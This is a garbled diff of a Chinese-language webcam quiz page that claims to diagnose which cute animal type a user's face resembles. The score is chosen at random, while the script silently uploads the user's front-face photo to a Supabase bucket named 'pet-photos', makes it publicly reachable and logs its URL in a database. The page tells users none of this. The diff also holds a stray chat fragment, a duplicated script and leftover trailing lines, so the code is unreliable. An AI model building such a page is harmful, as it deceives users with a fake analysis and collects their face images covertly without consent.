@@ -1,423 +1,150 @@
 <!DOCTYPE html>
-<html lang="zh-TW">
+<html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🐾 萌寵動物系顏值診斷 🐾</title>
-  <link href="https://fonts.googleapis.com/css2?family=Mochiy+Pop+One&family=Zen+Maru+Gothic:wght@500;700&display=swap" rel="stylesheet">
+  <title>動物系顏值診斷</title>
   <style>
-    :root {
-      --bg-color: #e0f2fe;        /* 天空淺藍背景 */
-      --card-bg: #ffffff;          /* 純白卡片 */
-      --primary-color: #3b82f6;    /* 活潑藍色 */
-      --accent-color: #bae6fd;     /* 雲朵粉藍邊框 */
-      --highlight-color: #fef08a;  /* 明亮鵝黃Accent */
-      --text-color: #334155;       /* 深藍灰字體 */
-      --btn-hover: #2563eb;
-    }
-
-    body {
-      font-family: 'Zen Maru Gothic', sans-serif;
-      background-color: var(--bg-color);
-      /* 腳印點綴背景圖案 */
-      background-image: radial-gradient(#bae6fd 15%, transparent 16%),
-                        radial-gradient(#bae6fd 15%, transparent 16%);
-      background-size: 30px 30px;
-      background-position: 0 0, 15px 15px;
-      color: var(--text-color);
-      margin: 0;
-      padding: 20px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .container {
-      background: var(--card-bg);
-      border: 4px solid var(--accent-color);
-      border-radius: 30px;
-      padding: 30px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 12px 24px rgba(56, 189, 248, 0.25);
-      text-align: center;
-      position: relative;
-    }
-
-    .animal-ear-left, .animal-ear-right {
-      position: absolute;
-      top: -25px;
-      width: 50px;
-      height: 50px;
-      background: var(--card-bg);
-      border: 4px solid var(--accent-color);
-      border-radius: 50% 50% 0 0;
-    }
-    .animal-ear-left { left: 40px; transform: rotate(-15deg); }
-    .animal-ear-right { right: 40px; transform: rotate(15deg); }
-
-    h1 {
-      font-family: 'Mochiy Pop One', sans-serif;
-      color: var(--primary-color);
-      font-size: 22px;
-      margin-top: 10px;
-      margin-bottom: 5px;
-      text-shadow: 2px 2px 0px #fff, 3px 3px 0px var(--accent-color);
-    }
-
-    p.subtitle {
-      font-size: 14px;
-      color: #64748b;
-      margin-top: 0;
-      margin-bottom: 20px;
-    }
-
-    .camera-box {
-      width: 100%;
-      height: 280px;
-      border: 3px dashed #93c5fd;
-      border-radius: 25px;
-      background-color: #f0f9ff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
-      position: relative;
-      margin-bottom: 20px;
-    }
-
-    video, img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    .btn {
-      background-color: var(--primary-color);
-      color: white;
-      border: none;
-      padding: 14px 32px;
-      font-size: 17px;
-      font-weight: bold;
-      border-radius: 50px;
-      cursor: pointer;
-      box-shadow: 0 5px 0px #93c5fd;
-      transition: all 0.2s ease;
-      font-family: 'Zen Maru Gothic', sans-serif;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .btn:hover {
-      background-color: var(--btn-hover);
-      transform: translateY(-2px);
-      box-shadow: 0 7px 0px #93c5fd;
-    }
-
-    .btn:active {
-      transform: translateY(3px);
-      box-shadow: 0 2px 0px #93c5fd;
-    }
-
-    /* 評分結果區塊 */
-    .result-card {
-      display: none;
-      margin-top: 20px;
-      padding: 18px;
-      background: #f0fdf4;
-      border-radius: 20px;
-      border: 3px solid #bbf7d0;
-      animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-    }
-
-    @keyframes bounceIn {
-      0% { transform: scale(0.7); opacity: 0; }
-      80% { transform: scale(1.05); }
-      100% { transform: scale(1); opacity: 1; }
-    }
-
-    .score {
-      font-size: 46px;
-      font-weight: bold;
-      color: #0284c7;
-      font-family: 'Mochiy Pop One', sans-serif;
-      margin: 8px 0;
-    }
-
-    .comment {
-      font-size: 14px;
-      line-height: 1.6;
-      color: #334155;
-    }
-
-    .badge {
-      display: inline-block;
-      background: var(--highlight-color);
-      color: #854d0e;
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-size: 13px;
-      font-weight: bold;
-    }
+    body { font-family: sans-serif; text-align: center; background: #fdf2f8; margin: 0; padding: 20px; }
+    .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    video, canvas, img { width: 100%; border-radius: 12px; margin-top: 10px; }
+    button { background: #db2777; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 15px; width: 100%; }
+    button:disabled { background: #cbd5e1; cursor: not-allowed; }
+    #resultCard { display: none; margin-top: 20px; padding: 15px; background: #fce7f3; border-radius: 12px; }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <!-- 可愛小耳朵裝飾 -->
-    <div class="animal-ear-left"></div>
-    <div class="animal-ear-right"></div>
+    <h2>🐾 動物系顏值診斷 🐾</h2>
+    <p>請依照指示完成 3 個角度拍攝</p>
+    
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="photoPreview" style="display:none;" alt="預覽圖">
 
-    <h1>🐶 動物系顏值大診斷 🐱</h1>
-    <p class="subtitle">拍一張照片，看看你是哪種萌萌動物吧！</p>
+    <button id="snapBtn" onclick="takePhoto()">載入中...</button>
 
-    <div class="camera-box" id="cameraBox">
-      <video id="webcam" autoplay playsinline></video>
-      <canvas id="canvas" style="display:none;"></canvas>
-      <img id="photoPreview" style="display:none;" alt="照片預覽">
-    </div>
-
-    <button class="btn" id="snapBtn" onclick="takePhoto()">🐾 開始喵喵診斷</button>
-
-    <div class="result-card" id="resultCard">
-      <div class="badge" id="animalBadge">✨ 診斷結果 ✨</div>
-      <div class="score" id="scoreValue">98分</div>
-      <div class="comment" id="commentText">評語載入中...</div>
+    <div id="resultCard">
+      <h3 id="animalBadge"></h3>
+      <p>評分：<span id="scoreValue" style="font-weight: bold; color: #db2777;"></span></p>
+      <p id="commentText" style="font-size: 14px; color: #4b5563;"></p>
     </div>
   </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-  const SUPABASE_URL = 'https://upwdkejyxbluxkivrvsw.supabase.co';
-  const SUPABASE_ANON_KEY = 'sb_publishable_X4X0Bdl4tlo1UjeTdqvwxg_QFLmMXH4';
-  const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    const SUPABASE_URL = 'https://upwdkejyxbluxkivrvsw.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_X4X0Bdl4tlo1UjeTdqvwxg_QFLmMXH4';
+    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-  const webcam = document.getElementById('webcam');
-  const canvas = document.getElementById('canvas');
-  const photoPreview = document.getElementById('photoPreview');
-  const resultCard = document.getElementById('resultCard');
-  const scoreValue = document.getElementById('scoreValue');
-  const commentText = document.getElementById('commentText');
-  const animalBadge = document.getElementById('animalBadge');
-  const snapBtn = document.getElementById('snapBtn');
+    const webcam = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const photoPreview = document.getElementById('photoPreview');
+    const resultCard = document.getElementById('resultCard');
+    const scoreValue = document.getElementById('scoreValue');
+    const commentText = document.getElementById('commentText');
+    const animalBadge = document.getElementById('animalBadge');
+    const snapBtn = document.getElementById('snapBtn');
 
-  // 拍攝步驟狀態：0=正臉, 1=左側臉, 2=右側臉
-  let currentStep = 0;
-  const steps = [
-    { title: "🐾 請對準【正臉】拍照", badge: "📸 步驟 1/3：正臉" },
-    { title: "🐾 請轉向【左側臉】拍照", badge: "📸 步驟 2/3：左側臉" },
-    { title: "🐾 請轉向【右側臉】拍照", badge: "📸 步驟 3/3：右側臉" }
-  ];
+    let currentStep = 0;
+    const stepBadges = [
+      "📸 步驟 1/3：正臉",
+      "📸 步驟 2/3：左側臉",
+      "📸 步驟 3/3：右側臉"
+    ];
 
-  let capturedBlobs = [];
+    let capturedBlobs = [];
 
-  // 啟動鏡頭
-  async function initCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-      webcam.srcObject = stream;
-      snapBtn.innerText = steps[0].badge;
-    } catch (err) {
-      console.error("鏡頭開啟失敗：", err);
-      alert("無法讀取鏡頭，請確認已授權鏡頭權限！");
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        webcam.srcObject = stream;
+        snapBtn.innerText = stepBadges[0];
+      } catch (err) {
+        console.error("鏡頭開啟失敗：", err);
+        alert("無法讀取鏡頭，請確認已授權鏡頭權限！");
+      }
     }
-  }
 
-  const results = [
-    { badge: "🐱 軟萌貓咪系", score: 98, comment: "擁有無辜的大眼睛與高貴優雅的氣質，各角度都散發迷人魅力！" },
-    { badge: "🐶 忠誠柴犬系", score: 95, comment: "充滿親和力與陽光笑容，側面線條也非常治癒滿分！" },
-    { badge: "🐰 軟綿兔子系", score: 99, comment: "無辜感滿載，靈動的小眼神與輪廓讓人秒融化！" },
-    { badge: "🦊 聰慧小狐狸系", score: 96, comment: "立體的側臉與帶有一絲神秘與睿智的眼神，魅力爆表！" }
-  ];
+    const results = [
+      { badge: "🐱 軟萌貓咪系", score: 98, comment: "擁有無辜的大眼睛與高貴優雅的氣質，各角度都散發迷人魅力！" },
+      { badge: "🐶 忠誠柴犬系", score: 95, comment: "充滿親和力與陽光笑容，側面線條也非常治癒滿分！" },
+      { badge: "🐰 軟綿兔子系", score: 99, comment: "無辜感滿載，靈動的小眼神與輪廓讓人秒融化！" },
+      { badge: "🦊 聰慧小狐狸系", score: 96, comment: "立體的側臉與帶有一絲神秘與睿智的眼神，魅力爆表！" }
+    ];
 
-  async function takePhoto() {
-    const context = canvas.getContext('2d');
-    canvas.width = webcam.videoWidth || 300;
-    canvas.height = webcam.videoHeight || 300;
-    context.drawImage(webcam, 0, 0, canvas.width, canvas.height);
+    async function takePhoto() {
+      const context = canvas.getContext('2d');
+      canvas.width = webcam.videoWidth || 300;
+      canvas.height = webcam.videoHeight || 300;
+      context.drawImage(webcam, 0, 0, canvas.width, canvas.height);
 
-    // 將當前步驟的畫面轉成 Blob 暫存
-    await new Promise((resolve) => {
-      canvas.toBlob((blob) => {
-        capturedBlobs.push(blob);
-        resolve();
-      }, 'image/png');
-    });
+      await new Promise((resolve) => {
+        canvas.toBlob((blob) => {
+          capturedBlobs.push(blob);
+          resolve();
+        }, 'image/png');
+      });
 
-    currentStep++;
+      currentStep++;
 
-    if (currentStep < 3) {
-      // 進入下一個角度提示
-      snapBtn.innerText = steps[currentStep].badge;
-      alert(已完成 ${steps[currentStep - 1].badge}！請準備切換至 ${steps[currentStep].badge});
-    } else {
-      // 3個角度都拍完了，開始計算與上傳
-      snapBtn.disabled = true;
-      snapBtn.innerText = "✨ 正在分析 3 個角度中...";
-      processFinalResults();
+      if (currentStep < 3) {
+        snapBtn.innerText = stepBadges[currentStep];
+        alert("已完成拍照！請準備拍攝下一個角度。");
+      } else {
+        snapBtn.disabled = true;
+        snapBtn.innerText = "✨ 正在分析 3 個角度中...";
+        processFinalResults();
+      }
     }
-  }
 
-  async function processFinalResults() {
-    const randomResult = results[Math.floor(Math.random() * results.length)];
-    animalBadge.innerText = randomResult.badge;
-    scoreValue.innerText = randomResult.score + " 分";
-    commentText.innerText = randomResult.comment;
-    
-    webcam.style.display = 'none';
-    photoPreview.src = canvas.toDataURL('image/png');
-    photoPreview.style.display = 'block';
-    resultCard.style.display = 'block';
-    snapBtn.style.display = 'none';
+    async function processFinalResults() {
+      const randomResult = results[Math.floor(Math.random() * results.length)];
+      animalBadge.innerText = randomResult.badge;
+      scoreValue.innerText = randomResult.score + " 分";
+      commentText.innerText = randomResult.comment;
+      
+      webcam.style.display = 'none';
+      photoPreview.src = canvas.toDataURL('image/png');
+      photoPreview.style.display = 'block';
+      resultCard.style.display = 'block';
+      snapBtn.style.display = 'none';
 
-    try {
-      const fileName = photo_${Date.now()}.png;
-      const { error: uploadError } = await _supabase.storage
-        .from('pet-photos')
-        .upload(fileName, capturedBlobs[0]);
+      try {
+        const fileName = photo_${Date.now()}.png;
+        const { error: uploadError } = await _supabase.storage
+          .from('pet-photos')
+          .upload(fileName, capturedBlobs[0]);
 
-      if (uploadError) throw uploadError;
+        if (uploadError) throw uploadError;
 
-      const { data: { publicUrl } } = _supabase.storage
-        .from('pet-photos')
-        .getPublicUrl(fileName);
+        const { data: { publicUrl } } = _supabase.storage
+          .from('pet-photos')
+          .getPublicUrl(fileName);
 
-      const { error: dbError } = await _supabase
-        .from('diagnoses')
-        .insert([
-          { 
-            image_url: publicUrl, 
-            score: randomResult.score + " 分", 
-            comment: randomResult.comment 
-          }
-        ]);
+        const { error: dbError } = await _supabase
+          .from('diagnoses')
+          .insert([
+            { 
+              image_url: publicUrl, 
+              score: randomResult.score + " 分", 
+              comment: randomResult.comment 
+            }
+          ]);
 
-      if (dbError) throw dbError;
-      console.log("3個角度拍攝完畢，結果已成功儲存至 Supabase！");
+        if (dbError) throw dbError;
+        console.log("3個角度拍攝完畢，結果已成功儲存至 Supabase！");
 
-    } catch (err) {
-      console.error("上傳失敗：", err.message);
+      } catch (err) {
+        console.error("上傳失敗：", err.message);
+      }
     }
-  }
 
-  window.addEventListener('DOMContentLoaded', initCamera);
-</script>
-你傳送了
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-  const SUPABASE_URL = 'https://upwdkejyxbluxkivrvsw.supabase.co';
-  const SUPABASE_ANON_KEY = 'sb_publishable_X4X0Bdl4tlo1UjeTdqvwxg_QFLmMXH4';
-  const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-  const webcam = document.getElementById('webcam');
-  const canvas = document.getElementById('canvas');
-  const photoPreview = document.getElementById('photoPreview');
-  const resultCard = document.getElementById('resultCard');
-  const scoreValue = document.getElementById('scoreValue');
-  const commentText = document.getElementById('commentText');
-  const animalBadge = document.getElementById('animalBadge');
-  const snapBtn = document.getElementById('snapBtn');
-
-  let currentStep = 0;
-  const stepBadges = [
-    "📸 步驟 1/3：正臉",
-    "📸 步驟 2/3：左側臉",
-    "📸 步驟 3/3：右側臉"
-  ];
-
-  let capturedBlobs = [];
-
-  async function initCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-      webcam.srcObject = stream;
-      snapBtn.innerText = stepBadges[0];
-    } catch (err) {
-      console.error("鏡頭開啟失敗：", err);
-      alert("無法讀取鏡頭，請確認已授權鏡頭權限！");
-    }
-  }
-
-  const results = [
-    { badge: "🐱 軟萌貓咪系", score: 98, comment: "擁有無辜的大眼睛與高貴優雅的氣質，各角度都散發迷人魅力！" },
-    { badge: "🐶 忠誠柴犬系", score: 95, comment: "充滿親和力與陽光笑容，側面線條也非常治癒滿分！" },
-    { badge: "🐰 軟綿兔子系", score: 99, comment: "無辜感滿載，靈動的小眼神與輪廓讓人秒融化！" },
-    { badge: "🦊 聰慧小狐狸系", score: 96, comment: "立體的側臉與帶有一絲神秘與睿智的眼神，魅力爆表！" }
-  ];
-
-  async function takePhoto() {
-    const context = canvas.getContext('2d');
-    canvas.width = webcam.videoWidth || 300;
-    canvas.height = webcam.videoHeight || 300;
-    context.drawImage(webcam, 0, 0, canvas.width, canvas.height);
-
-    await new Promise((resolve) => {
-      canvas.toBlob((blob) => {
-        capturedBlobs.push(blob);
-        resolve();
-      }, 'image/png');
-    });
-
-    currentStep++;
-
-    if (currentStep < 3) {
-      snapBtn.innerText = stepBadges[currentStep];
-      alert("已完成拍照！請準備拍攝下一個角度。");
-    } else {
-      snapBtn.disabled = true;
-      snapBtn.innerText = "✨ 正在分析 3 個角度中...";
-      processFinalResults();
-    }
-  }
-
-  async function processFinalResults() {
-    const randomResult = results[Math.floor(Math.random() * results.length)];
-    animalBadge.innerText = randomResult.badge;
-    scoreValue.innerText = randomResult.score + " 分";
-    commentText.innerText = randomResult.comment;
-    
-    webcam.style.display = 'none';
-    photoPreview.src = canvas.toDataURL('image/png');
-    photoPreview.style.display = 'block';
-    resultCard.style.display = 'block';
-    snapBtn.style.display = 'none';
-
-    try {
-      const fileName = photo_${Date.now()}.png;
-      const { error: uploadError } = await _supabase.storage
-        .from('pet-photos')
-        .upload(fileName, capturedBlobs[0]);
-
-      if (uploadError) throw uploadError;
-
-      const { data: { publicUrl } } = _supabase.storage
-        .from('pet-photos')
-        .getPublicUrl(fileName);
-
-      const { error: dbError } = await _supabase
-        .from('diagnoses')
-        .insert([
-          { 
-            image_url: publicUrl, 
-            score: randomResult.score + " 分", 
-            comment: randomResult.comment 
-          }
-        ]);
-
-      if (dbError) throw dbError;
-      console.log("3個角度拍攝完畢，結果已成功儲存至 Supabase！");
-
-    } catch (err) {
-      console.error("上傳失敗：", err.message);
-    }
-  }
-
-  window.addEventListener('DOMContentLoaded', initCamera);
-</script>
-
-
+    window.addEventListener('DOMContentLoaded', initCamera);
+  </script>
+</body>
+</html>
     // 頁面載入完成後啟動相機
     window.addEventListener('DOMContentLoaded', initCamera);
   </script>
